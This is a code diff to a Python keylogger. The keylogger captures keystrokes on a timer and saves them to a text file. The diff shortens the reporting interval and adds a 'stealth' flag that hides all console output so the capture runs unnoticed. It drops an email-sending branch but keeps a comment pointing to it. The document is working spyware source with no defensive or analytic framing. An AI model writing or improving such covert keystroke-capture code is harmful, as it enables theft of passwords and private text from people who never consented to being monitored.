@@ -10,13 +10,14 @@ from threading import Timer
 from datetime import datetime
 import os
 
-SEND_REPORT_EVERY = 60 
+SEND_REPORT_EVERY = 20
 
 class Keylogger:
-    def __init__(self, interval, report_method="file"):
+    def __init__(self, interval, report_method="file",stealty =False):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
+        self.stealty = stealty
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
@@ -63,8 +64,12 @@ class Keylogger:
         # open the file in write mode (create it)
         with open(f"{os.path.dirname(__file__)}/{self.filename}.txt", "w") as f:
             # write the keylogs to the file
+            
+        
             print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        
+        if not self.stealty:
+            print(f"[+] Saved {self.filename}.txt")
         
         
         
@@ -81,12 +86,12 @@ class Keylogger:
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
+            
+            if self.report_method == "file":
                 self.report_to_file()
             # if you don't want to print in the console, comment below line
-            print(f"[{self.filename}] - {self.log}")
+            if not self.stealty:
+                print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -104,22 +109,21 @@ class Keylogger:
         # start reporting the keylogs
         self.report()
         # make a simple message
-        print(f"{datetime.now()} - Started keylogger")
+        if not self.stealty:
+            print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
         
         
         
         
-def mains():        
-    if __name__ == "__main__":
-        # if you want a keylogger to send to your email
-        # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-        # if you want a keylogger to record keylogs to a local file 
-        # (and then send it using your favorite method)
-        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-        keylogger.start()
-    
-keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
-keylogger.start()
+
+if __name__ == "__main__":
+     # if you want a keylogger to send to your email
+     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+     # if you want a keylogger to record keylogs to a local file 
+     # (and then send it using your favorite method)
+     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+     keylogger.start()
+
 
